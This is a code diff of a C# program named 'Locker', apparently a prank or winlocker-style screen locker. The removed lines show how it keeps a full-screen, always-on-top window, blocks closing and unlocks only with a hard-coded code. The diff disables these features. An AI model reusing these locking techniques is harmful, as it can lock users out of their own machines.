@@ -63,118 +63,20 @@ namespace Locker
             this.ShowInTaskbar = false;
             this.FormBorderStyle = FormBorderStyle.None;
             this.Move += delegate { this.Capture = false; };
-            Sound.PlayLooping();
+            //Sound.PlayLooping();
             for (j = 0; j <= 2; j++)
             {
-                this.BackgroundImage = Properties.Resources.pic1;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic2;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic3;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic4;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic5;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic6;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic23;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic8;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic9;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic10;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic11;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic22;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic13;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic14;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic15;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic16;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic17;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic18;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic19;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic20;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic21;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic12;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic7;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic24;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
-                Pause(250);
-                this.BackgroundImage = Properties.Resources.pic25;
-                this.WindowState = FormWindowState.Maximized;
-                this.TopMost = true;
+                
                 j--;
             }
         }
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (k == 0) e.Cancel = true;
+            //if (k == 0) e.Cancel = true;
         }
         private void Form1_FormClosed(object sender, FormClosedEventArgs e)
         {
-            Sound.Stop();
+            //Sound.Stop();
         }
         private void textBox1_TextChanged(object sender, EventArgs e)
         {
@@ -182,7 +84,7 @@ namespace Locker
         }
         private void button1_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text == "2281337") { exitbutton.Visible = true; k = 1; }
+            if (textBox1.Text == "123") { exitbutton.Visible = true; k = 1; }
         }
         private void exitbutton_Click(object sender, EventArgs e)
         {
